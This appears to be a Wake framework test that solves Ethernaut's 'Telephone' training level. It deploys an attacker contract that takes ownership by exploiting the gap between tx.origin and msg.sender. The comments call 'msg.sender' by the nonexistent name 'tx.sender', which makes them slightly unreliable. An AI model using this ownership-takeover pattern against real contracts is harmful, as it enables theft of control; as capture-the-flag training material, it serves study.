from wake.testing import *
from tests.ethernaut_deployer import EthernautDeployer
from pytypes.contracts.lv04_telephone import Telephone
from pytypes.contracts.attacker.lv04_tunnel import Tunnel

@default_chain.connect()
def test_level_04():
    service = EthernautDeployer(default_chain)
    contract = service.deploy_lv04()
    do_level_04_solution(contract)
    service.check_lv04(contract)
    
def do_level_04_solution(contract: Telephone):
    # Problem: tx.origin is not changed in redirect => can be used for phissing attack
    # Training: difference between tx.origin and tx.sender
    #   In a simple call chain A->B->C->D
    #        inside D msg.sender will be C, and tx.origin will be A
    #        inside C msg.sender will be B, and tx.origin will be A
    tunnel = Tunnel.deploy()
    tunnel.changeOwner(contract)
